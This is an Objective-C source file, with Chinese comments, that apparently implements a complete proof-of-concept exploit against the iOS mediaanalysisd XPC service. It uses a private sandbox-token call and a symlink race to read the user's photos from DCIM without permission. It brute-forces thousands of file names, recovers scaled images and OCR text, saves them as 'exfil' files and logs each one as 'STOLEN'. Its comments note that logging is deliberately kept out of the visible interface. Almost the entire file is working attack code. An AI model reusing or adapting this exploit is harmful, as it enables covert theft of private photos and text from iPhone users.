//
//  MediaAnalysisRace.m
//  无 UI 的 mediaanalysisd 公共 XPC TOCTOU（symlink race）照片读取 POC。
//
//  来源：poc-ipa/poc/ViewController.m（原样逻辑），仅剥离界面：
//    - 删除 UIImageView / UILabel / setStatus: / showImage:
//    - 日志只写 Documents/poc.log，不写 NSLog（setupLogCapture 会把 stderr
//      捕进 AppLog 再显示到 LogView 页面，故这里刻意不用 NSLog），页面不显示。
//  其余逻辑（ensureConnection / makeCombinedRequest / imageFromReply /
//  textFromReply / tryExfil / runDump）保持不变。
//

#import "MediaAnalysisRace.h"
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>
#import <stdlib.h>
#import <math.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreImage/CoreImage.h>

// sandbox_extension_issue_file 是 libSystem 私有符号，公开 .tbd 里没有，
// 这里用 dlsym 运行时解析，避免给工程加 -Wl,-undefined,dynamic_lookup。
static char *issueReadToken(const char *path)
{
    static char *(*fn)(const char *, const char *, uint32_t) = NULL;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        void *lib = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
        if (lib) {
            fn = (char *(*)(const char *, const char *, uint32_t))dlsym(lib, "sandbox_extension_issue_file");
        }
    });
    if (!fn) return NULL;
    return fn("com.apple.app-sandbox.read", path, 0);
}

static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
{
    // initWithMachServiceName:options: 在 iOS SDK 头文件里被标 API_UNAVAILABLE(ios)，
    // 但运行时确实存在（用于连私有 mach service）。用 objc_msgSend 绕过编译期可用性检查，
    // 与 poc-ipa 原版 ViewController.m 完全一致。
    NSXPCConnection *alloc = [NSXPCConnection alloc];
    SEL sel = NSSelectorFromString(@"initWithMachServiceName:options:");
    return ((id(*)(id, SEL, id, NSUInteger))objc_msgSend)(alloc, sel, serviceName, 0);
}

@protocol VCPMADServicePublicServerProtocol <NSObject>
@optional
- (void)requestImageProcessing:(id)requests
                   forAssetURL:(NSURL *)url
              withSandboxToken:(NSString *)token
                    identifier:(NSString *)identifier
                     requestID:(int)requestID
                      andReply:(void (^)(id, id))reply;
@end

@interface MediaAnalysisRaceRunner : NSObject
@end

@implementation MediaAnalysisRaceRunner {
    NSXPCConnection *_conn;
    int _reqID;
    NSString *_logFilePath;
    NSFileHandle *_logFH;
    BOOL _dumpedOCR;
    int _ocrErrCount;
    BOOL _started;
}

- (void)start
{
    @synchronized (self) {
        if (_started) return;
        _started = YES;
    }
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self runDump];
    });
}

- (void)setupLogFile
{
    _logFilePath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/poc.log"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:_logFilePath]) {
        [[NSFileManager defaultManager] createFileAtPath:_logFilePath contents:nil attributes:nil];
    }
    _logFH = [NSFileHandle fileHandleForWritingAtPath:_logFilePath];
    [_logFH seekToEndOfFile];
}

- (void)log:(NSString *)line
{
    NSDateFormatter *df = [[NSDateFormatter alloc] init];
    [df setDateFormat:@"HH:mm:ss.SSS"];
    NSString *stamp = [df stringFromDate:[NSDate date]];
    NSString *entry = [NSString stringWithFormat:@"[%@] %@\n", stamp, line];
    if (_logFH) {
        @try {
            [_logFH writeData:[entry dataUsingEncoding:NSUTF8StringEncoding]];
            [_logFH synchronizeFile];
        } @catch (NSException *e) {}
    }
}

- (NSString *)issueTokenForPath:(NSString *)path
{
    char *raw = issueReadToken(path.UTF8String);
    if (!raw) return nil;
    NSString *tok = [NSString stringWithUTF8String:raw];
    free(raw);
    return tok;
}

- (void)ensureConnection
{
    if (_conn) return;

    dlopen("/System/Library/PrivateFrameworks/MediaAnalysis.framework/MediaAnalysis", RTLD_NOW);
    dlopen("/System/Library/PrivateFrameworks/MediaAnalysisServices.framework/MediaAnalysisServices", RTLD_NOW);

    _conn = CreateMachServiceConnection(@"com.apple.mediaanalysisd.service.public");

    NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:@protocol(VCPMADServicePublicServerProtocol)];

    NSMutableSet *allowed = [NSMutableSet setWithObjects:
        [NSDictionary class], [NSMutableDictionary class],
        [NSArray class], [NSMutableArray class],
        [NSString class], [NSNumber class],
        [NSData class], [NSError class],
        [NSSet class], [NSMutableSet class],
        [NSURL class], [NSNull class],
        [NSDate class], [NSValue class], nil];

    for (NSString *name in @[@"MADRequest", @"MADMLScalingRequest", @"MADMLScalingResult",
                             @"MADMLEnhancementRequest", @"MADMLEnhancementResult",
                             @"MADVIDocumentRecognitionRequest", @"MADVIDocumentRecognitionResult",
                             @"MADVITextLookupRequest", @"MADVITextLookupResult",
                             @"MADRemoveBackgroundMaskRequest", @"MADRemoveBackgroundMatteRequest",
                             @"VCPProtoAssetAnalysis", @"VITextBlockAnnotation",
                             @"VNObservation", @"VNRecognizedTextObservation"])
    {
        Class c = NSClassFromString(name);
        if (c) [allowed addObject:c];
    }

    SEL sel = @selector(requestImageProcessing:forAssetURL:withSandboxToken:identifier:requestID:andReply:);
    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:NO];
    [iface setClasses:allowed forSelector:sel argumentIndex:0 ofReply:YES];
    [iface setClasses:allowed forSelector:sel argumentIndex:1 ofReply:YES];

    _conn.remoteObjectInterface = iface;
    _conn.interruptionHandler = ^{ [self log:@"XPC interrupted"]; };
    _conn.invalidationHandler = ^{ [self log:@"XPC invalidated"]; };
    [_conn resume];
}

// FLAT combined request: one scaling (200x200) + one document-recognition (OCR).
- (NSArray *)makeCombinedRequest
{
    NSMutableArray *reqs = [NSMutableArray array];

    Class scls = NSClassFromString(@"MADMLScalingRequest");
    if (scls) {
        id sreq = [scls new];
        [sreq setValue:@(200) forKey:@"scaledImageWidth"];
        [sreq setValue:@(200) forKey:@"scaledImageHeight"];
        [sreq setValue:@(1) forKey:@"scalingModelIndex"];
        [reqs addObject:sreq];
    }

    Class dcls = NSClassFromString(@"MADVIDocumentRecognitionRequest");
    if (dcls) {
        [reqs addObject:[dcls new]];
    }

    return reqs;
}

- (UIImage *)imageFromReply:(id)arg1
{
    if (![arg1 isKindOfClass:[NSArray class]]) return nil;

    for (id req in (NSArray *)arg1)
    {
        @try {
            id err = [req valueForKey:@"error"];
            if (err) continue;

            NSArray *results = [req valueForKey:@"results"];
            if (![results isKindOfClass:[NSArray class]] || results.count == 0) continue;

            for (id result in results)
            {
                SEL pbSel = NSSelectorFromString(@"pixelBuffer");
                if (![result respondsToSelector:pbSel]) continue;

                CVPixelBufferRef buf = ((CVPixelBufferRef(*)(id,SEL))objc_msgSend)(result, pbSel);
                if (!buf) continue;

                CIImage *ci = [CIImage imageWithCVPixelBuffer:buf];
                if (!ci) continue;

                CIContext *ctx = [CIContext contextWithOptions:nil];
                CGImageRef cg = [ctx createCGImage:ci fromRect:ci.extent];
                if (!cg) continue;

                UIImage *img = [UIImage imageWithCGImage:cg];
                CGImageRelease(cg);
                return img;
            }
        } @catch (NSException *e) {}
    }
    return nil;
}

// Recursive fallback extractor (handles unknown structures).
- (NSString *)extractTextFromObject:(id)obj depth:(int)depth
{
    if (!obj || depth > 5) return @"";
    NSMutableString *out = [NSMutableString string];

    if ([obj isKindOfClass:[NSString class]]) {
        if ([obj length]) [out appendFormat:@"%@\n", obj];
        return out;
    }

    NSString *clsName = NSStringFromClass([obj class]);
    if ([clsName rangeOfString:@"Surface"].location != NSNotFound ||
        [clsName rangeOfString:@"Buffer"].location != NSNotFound ||
        [clsName rangeOfString:@"NSNumber"].location != NSNotFound ||
        [clsName rangeOfString:@"NSData"].location != NSNotFound ||
        [clsName rangeOfString:@"NSDate"].location != NSNotFound ||
        [clsName rangeOfString:@"NSValue"].location != NSNotFound ||
        [clsName rangeOfString:@"NSURL"].location != NSNotFound)
    {
        return @"";
    }

    for (NSString *key in @[@"text", @"string", @"documentText", @"stringValue"]) {
        @try {
            id v = [obj valueForKey:key];
            if ([v isKindOfClass:[NSString class]] && [v length]) [out appendFormat:@"%@\n", v];
        } @catch (NSException *e) {}
    }

    @try {
        id cands = [obj valueForKey:@"topCandidates"];
        if ([cands isKindOfClass:[NSArray class]]) {
            for (id c in cands) {
                @try {
                    id s = [c valueForKey:@"string"];
                    if ([s isKindOfClass:[NSString class]] && [s length]) [out appendFormat:@"%@\n", s];
                } @catch (NSException *e) {}
            }
        }
    } @catch (NSException *e) {}

    Class c = [obj class];
    while (c && c != [NSObject class]) {
        unsigned int n = 0;
        Ivar *iv = class_copyIvarList(c, &n);
        for (unsigned int i = 0; i < n; i++) {
            const char *ty = ivar_getTypeEncoding(iv[i]);
            if (ty && ty[0] == '@') {
                @try {
                    id v = object_getIvar(obj, iv[i]);
                    if (v && v != obj) {
                        if ([v isKindOfClass:[NSArray class]]) {
                            for (id e in (NSArray *)v) {
                                NSString *sub = [self extractTextFromObject:e depth:depth+1];
                                if (sub.length) [out appendString:sub];
                            }
                        } else {
                            NSString *sub = [self extractTextFromObject:v depth:depth+1];
                            if (sub.length) [out appendString:sub];
                        }
                    }
                } @catch (NSException *e) {}
            }
        }
        free(iv);
        c = class_getSuperclass(c);
    }

    return out;
}

- (NSString *)textFromReply:(id)arg1
{
    if (![arg1 isKindOfClass:[NSArray class]]) return nil;
    NSMutableSet *seen = [NSMutableSet set];
    // 有位置信息的条目：@[text, @(centerY), @(minX), @(height), @(confidence)]
    NSMutableArray *positioned = [NSMutableArray array];
    // 拿不到位置时回退的文本行（排最后）
    NSMutableArray *fallback = [NSMutableArray array];
    // OCR 置信度累计（Vision confidence，0~1）
    double confSum = 0;
    int confCount = 0;

    for (id reqObj in (NSArray *)arg1)
    {
        @try {
            id err = [reqObj valueForKey:@"error"];
            if (err) {
                self->_ocrErrCount++;
                if (self->_ocrErrCount == 1) {
                    [self log:[NSString stringWithFormat:@"[ocr] first reply error: %@", err]];
                }
                continue;
            }

            NSArray *results = [reqObj valueForKey:@"results"];
            if (![results isKindOfClass:[NSArray class]]) continue;

            for (id result in results)
            {
                if (!_dumpedOCR && [NSStringFromClass([result class]) rangeOfString:@"DocumentRecognition"].location != NSNotFound) {
                    _dumpedOCR = YES;
                    [self dumpIvars:result tag:@"ocr-result"];
                }

                BOOL gotPositioned = NO;

                // preferred: observations -> text + boundingBox（按图片中的实际位置排列）
                @try {
                    NSArray *obs = [result valueForKey:@"observations"];
                    if ([obs isKindOfClass:[NSArray class]]) {
                        for (id o in obs) {
                            @try {
                                id t = [o valueForKey:@"text"];
                                if (![t isKindOfClass:[NSString class]] || ![t length] || [seen containsObject:t]) continue;
                                [seen addObject:t];

                                CGRect box = CGRectZero;
                                id bb = [o valueForKey:@"boundingBox"];
                                if ([bb isKindOfClass:[NSValue class]]) {
                                    box = [bb CGRectValue];
                                }
                                // Vision 坐标原点在左下：centerY 越大越靠上，minX 越小越靠左
                                double cy = CGRectGetMidY(box);
                                double cx = CGRectGetMinX(box);
                                double h  = CGRectGetHeight(box);
                                double conf = 0;
                                @try {
                                    id cv = [o valueForKey:@"confidence"];
                                    if ([cv isKindOfClass:[NSNumber class]]) conf = [cv doubleValue];
                                } @catch (NSException *e) {}
                                if (conf <= 0) {
                                    // Vision 的置信度可能挂在 topCandidates[0].confidence 上
                                    @try {
                                        id cands = [o valueForKey:@"topCandidates"];
                                        if ([cands isKindOfClass:[NSArray class]] && [(NSArray *)cands count] > 0) {
                                            id first = [(NSArray *)cands objectAtIndex:0];
                                            id cv2 = [first valueForKey:@"confidence"];
                                            if ([cv2 isKindOfClass:[NSNumber class]]) conf = [cv2 doubleValue];
                                        }
                                    } @catch (NSException *e) {}
                                }
                                [positioned addObject:@[t, @(cy), @(cx), @(h), @(conf)]];
                                confSum += conf;
                                confCount += 1;
                                gotPositioned = YES;
                            } @catch (NSException *e) {}
                        }
                    }
                } @catch (NSException *e) {}

                // fallback: recursive walk（拿不到位置信息时）
                if (!gotPositioned) {
                    NSString *t = [self extractTextFromObject:result depth:0];
                    if (t.length) {
                        for (NSString *ln in [t componentsSeparatedByString:@"\n"]) {
                            if (ln.length && ![seen containsObject:ln]) { [seen addObject:ln]; [fallback addObject:ln]; }
                        }
                    }
                }
            }
        } @catch (NSException *e) {
            [self log:[NSString stringWithFormat:@"[ocr] exception: %@", e.reason]];
        }
    }

    // 先按从上到下（centerY 降序），再按从左到右（minX 升序）
    [positioned sortUsingComparator:^NSComparisonResult(id a, id b) {
        double ay = [a[1] doubleValue];
        double by = [b[1] doubleValue];
        if (ay > by) return NSOrderedAscending;
        if (ay < by) return NSOrderedDescending;
        double ax = [a[2] doubleValue];
        double bx = [b[2] doubleValue];
        if (ax < bx) return NSOrderedAscending;
        if (ax > bx) return NSOrderedDescending;
        return NSOrderedSame;
    }];

    // 垂直中心接近的归为同一“行”：行内从左到右用空格分隔，行与行用换行分隔
    NSMutableArray *rows = [NSMutableArray array];
    for (NSArray *item in positioned) {
        double cy = [item[1] doubleValue];
        double h  = [item[3] doubleValue];
        NSMutableArray *lastRow = [rows lastObject];
        if (lastRow) {
            NSArray *first = [lastRow firstObject];
            double lastCy = [first[1] doubleValue];
            double lastH  = [first[3] doubleValue];
            double mh = (h > lastH) ? h : lastH;
            double threshold = 0.6 * mh;
            if (threshold < 0.012) threshold = 0.012;
            if (fabs(cy - lastCy) > threshold) {
                lastRow = nil;
            }
        }
        if (!lastRow) {
            lastRow = [NSMutableArray array];
            [rows addObject:lastRow];
        }
        [lastRow addObject:item];
    }

    NSMutableArray *outLines = [NSMutableArray array];
    for (NSArray *row in rows) {
        NSMutableArray *texts = [NSMutableArray array];
        for (NSArray *item in row) {
            [texts addObject:item[0]];
        }
        [outLines addObject:[texts componentsJoinedByString:@"  "]];
    }
    [outLines addObjectsFromArray:fallback];

    if (!outLines.count) return nil;
    NSString *plain = [outLines componentsJoinedByString:@"\n"];
    double avgConf = confCount > 0 ? (confSum / confCount) : 0.0;
    NSDictionary *json = @{ @"text": plain, @"confidence": @(avgConf) };
    NSData *data = [NSJSONSerialization dataWithJSONObject:json options:0 error:nil];
    if (!data) return plain;
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
}

- (void)dumpIvars:(id)obj tag:(NSString *)tag
{
    if (!obj) return;
    Class c = [obj class];
    while (c && c != [NSObject class]) {
        unsigned int n = 0;
        Ivar *iv = class_copyIvarList(c, &n);
        for (unsigned int i = 0; i < n; i++) {
            const char *nm = ivar_getName(iv[i]);
            const char *ty = ivar_getTypeEncoding(iv[i]);
            NSString *val = @"(non-object)";
            if (ty && ty[0] == '@') {
                @try {
                    id v = object_getIvar(obj, iv[i]);
                    val = v ? [v description] : @"nil";
                } @catch (NSException *e) { val = @"<exception>"; }
            }
            [self log:[NSString stringWithFormat:@"  [%@] %@ : %s = %@",
                        tag, [NSString stringWithUTF8String:nm], ty ? ty : "", val]];
        }
        free(iv);
        c = class_getSuperclass(c);
    }
}

- (BOOL)tryExfil:(NSString *)target
        racePath:(NSString *)racePath
     symlinkPath:(NSString *)symlinkPath
       decoyData:(NSData *)decoyData
           delay:(useconds_t)delay
{
    unlink(racePath.UTF8String);
    [decoyData writeToFile:racePath atomically:NO];

    unlink(symlinkPath.UTF8String);
    symlink(target.UTF8String, symlinkPath.UTF8String);

    NSString *token = [self issueTokenForPath:racePath];
    if (!token) return NO;

    NSURL *url = [NSURL fileURLWithPath:racePath];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block UIImage *img = nil;
    __block NSString *text = nil;

    id<VCPMADServicePublicServerProtocol> proxy =
        [_conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
            dispatch_semaphore_signal(sem);
        }];

    [proxy requestImageProcessing:[self makeCombinedRequest]
                      forAssetURL:url
                 withSandboxToken:token
                       identifier:@"d"
                        requestID:[self nextRequestID]
                         andReply:^(id arg1, id arg2) {
        img = [self imageFromReply:arg1];
        text = [self textFromReply:arg1];
        dispatch_semaphore_signal(sem);
    }];

    usleep(delay);
    rename(symlinkPath.UTF8String, racePath.UTF8String);

    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    if (!img) return NO;

    CGImageRef cg = img.CGImage;
    if (!cg) return NO;

    uint8_t px[4] = {0};
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(px, 1, 1, 8, 4, cs,
        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    CGContextDrawImage(ctx, CGRectMake(0, 0, CGImageGetWidth(cg), CGImageGetHeight(cg)), cg);
    CGContextRelease(ctx);

    // decoy = pure green (0,255,0)
    BOOL isDecoy = (px[0] < 50 && px[1] > 200 && px[2] < 50);
    if (isDecoy) return NO;

    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    // 命中照片与 OCR 文本统一放入沙盒 Documents/P 目录
    NSString *outDir = [docs stringByAppendingPathComponent:@"P"];
    [[NSFileManager defaultManager] createDirectoryAtPath:outDir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];
    NSString *base = [target lastPathComponent];

    NSString *pngPath = [outDir stringByAppendingPathComponent:[NSString stringWithFormat:@"exfil_%@.png", base]];
    [UIImagePNGRepresentation(img) writeToFile:pngPath atomically:YES];

    if (text.length) {
        NSString *txtPath = [outDir stringByAppendingPathComponent:[NSString stringWithFormat:@"exfil_%@.txt", base]];
        [text writeToFile:txtPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }

    [self log:[NSString stringWithFormat:@"STOLEN %@ text=%lu bytes", base, (unsigned long)text.length]];
    return YES;
}

// 并发下 requestID 必须原子自增
- (int)nextRequestID
{
    @synchronized (self) {
        return ++_reqID;
    }
}

// 并发扫描一个目录里 [start, start+count) 的编号段；每张照片用独立临时文件。
- (int)scanChunk:(int)folder
           start:(int)start
           count:(int)count
             tmp:(NSString *)tmp
           decoy:(NSData *)decoyData
           total:(int *)scannedTotal
{
    // 覆盖所有来源：相机/截屏 IMG_、编辑版 IMG_E、全景 PANO_；4 位和 5 位编号
    NSArray<NSNumber *> *delays = @[@0, @5, @10, @20, @30, @50, @80, @120];
    NSArray<NSString *> *prefixes = @[@"IMG_%04d", @"IMG_%05d", @"IMG_E%04d", @"PANO_%04d"];
    NSArray<NSString *> *exts = @[@"HEIC", @"HEIF", @"JPG", @"JPEG", @"PNG",
                                  @"DNG", @"TIF", @"TIFF", @"GIF", @"BMP", @"WEBP"];
    __block int hits = 0;
    dispatch_semaphore_t limit = dispatch_semaphore_create(8);
    dispatch_group_t group = dispatch_group_create();
    dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0);

    for (int j = 0; j < count; j++) {
        dispatch_semaphore_wait(limit, DISPATCH_TIME_FOREVER);
        dispatch_group_async(group, q, ^{
            int num = start + j;
            for (NSUInteger p = 0; p < prefixes.count; p++) {
                NSString *base = [NSString stringWithFormat:prefixes[p], num];
                for (NSUInteger e = 0; e < exts.count; e++) {
                    NSString *ext = exts[e];
                    NSString *name = [NSString stringWithFormat:@"%@.%@", base, ext];
                    NSString *target = [NSString stringWithFormat:
                        @"/private/var/mobile/Media/DCIM/%dAPPLE/%@", folder, name];
                    NSString *racePath = [tmp stringByAppendingPathComponent:
                        [NSString stringWithFormat:@"race_%d_%lu_%lu_%lu.%@",
                         folder, (unsigned long)num, (unsigned long)p,
                         (unsigned long)e, ext]];
                    NSString *symPath = [tmp stringByAppendingPathComponent:
                        [NSString stringWithFormat:@"sym_%d_%lu_%lu_%lu.%@",
                         folder, (unsigned long)num, (unsigned long)p,
                         (unsigned long)e, ext]];
                    for (NSUInteger a = 0; a < delays.count; a++) {
                        if (scannedTotal) {
                            @synchronized (self) { (*scannedTotal)++; }
                        }
                        if ([self tryExfil:target
                                  racePath:racePath
                               symlinkPath:symPath
                                 decoyData:decoyData
                                     delay:(useconds_t)[delays[a] unsignedIntValue]]) {
                            @synchronized (self) { hits++; }
                            [self log:[NSString stringWithFormat:
                                @"STOLEN %dAPPLE/%@", folder, name]];
                            break;
                        }
                    }
                }
            }
            dispatch_semaphore_signal(limit);
        });
    }
    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
    return hits;
}

- (void)runDump
{
    [self setupLogFile];
    [self log:@"=== start (200x200 exfil + OCR) ==="];
    [self ensureConnection];

    NSString *tmp = NSTemporaryDirectory();

    NSString *decoyPath = [tmp stringByAppendingPathComponent:@"decoy.png"];
    CGSize sz = CGSizeMake(400, 400);
    UIGraphicsBeginImageContextWithOptions(sz, YES, 1.0);
    [[UIColor colorWithRed:0 green:1 blue:0 alpha:1] setFill];
    UIRectFill(CGRectMake(0, 0, sz.width, sz.height));
    UIImage *decoyImg = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    [UIImagePNGRepresentation(decoyImg) writeToFile:decoyPath atomically:YES];
    NSData *decoyData = [NSData dataWithContentsOfFile:decoyPath];

    int exfiled = 0;
    int scanned = 0;

    // 每个目录都把 IMG_0001..9999 全部扫完、不提前跳过；扫完一个目录再进下一个。
    // 段内 10 张并发，每张一个任务。
    for (int folder = 100; folder <= 109; folder++)
    {
        int folderHits = 0;
        for (int start = 1; start <= 9999; start += 10)
        {
            int hits = [self scanChunk:folder
                                 start:start
                                 count:10
                                   tmp:tmp
                                 decoy:decoyData
                                 total:&scanned];
            if (hits > 0) {
                folderHits += hits;
                exfiled += hits;
            }
            if ((start - 1) % 50 == 0) {
                [self log:[NSString stringWithFormat:
                    @"%dAPPLE/IMG_%04d... exfil=%d probes=%d", folder, start, exfiled, scanned]];
            }
        }
        // 二次扫描补漏：照片通常集中在前 200 个编号，再扫一遍
        for (int start = 1; start <= 200; start += 10)
        {
            int hits = [self scanChunk:folder
                                 start:start
                                 count:10
                                   tmp:tmp
                                 decoy:decoyData
                                 total:&scanned];
            if (hits > 0) {
                folderHits += hits;
                exfiled += hits;
            }
        }
        [self log:[NSString stringWithFormat:
            @"%dAPPLE done: hits=%d scanned=%d", folder, folderHits, scanned]];
    }

    [self log:[NSString stringWithFormat:@"DONE exfil=%d scanned=%d ocrErr=%d", exfiled, scanned, _ocrErrCount]];
}

@end

void MediaAnalysisRaceRun(void)
{
    static dispatch_once_t onceToken;
    static MediaAnalysisRaceRunner *runner;
    dispatch_once(&onceToken, ^{
        runner = [[MediaAnalysisRaceRunner alloc] init];
    });
    [runner start];
}
